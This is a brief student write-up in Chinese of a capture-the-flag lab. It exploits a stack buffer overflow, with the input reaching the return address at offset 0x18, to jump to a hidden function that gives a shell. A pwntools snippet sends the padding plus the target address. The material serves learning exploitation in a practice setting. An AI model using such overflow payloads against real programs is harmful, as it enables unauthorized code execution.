# lab 2
這題hen明顯就是bof

它最多讀0x30個字進去 可是陣列大小只有16個 可以bof

`y0u_c4n7_533_m3()` 跳上這個函數 就可以拿到 shell

`y0u_c4n7_533_m3()`的位置是 `0x00400607`

用gdb 追 可以發現 輸入的東西跟 main 的return addr 差了 0x18

```=
n.recvuntil('\n')

n.sendline('a'*0x18+p64(0x00400607))


n.interactive()
```
問題還是不知道 `read()` 到底要怎麼用 

看看pwntool那題 read() 還是差了 `&`
